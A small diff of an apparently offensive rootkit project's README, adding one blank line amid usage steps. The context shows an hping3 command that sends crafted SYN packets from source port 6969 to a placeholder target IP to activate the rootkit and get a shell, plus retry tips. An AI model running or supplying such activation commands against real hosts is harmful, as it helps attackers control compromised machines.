@@ -64,6 +64,7 @@ In another terminal, send packets that will activate the rootkit:
 ```sudo hping3 -S -p 80 -s 6969 <TARGET_IP>```
 
 🔹 Port 80 is a good choice for the destination port.
+
 🔹 If the shell doesn’t connect after ~5 packets, press Ctrl + C and re-run the command (packet filtering can be finicky).
 
 ## 🧩 Additional Notes
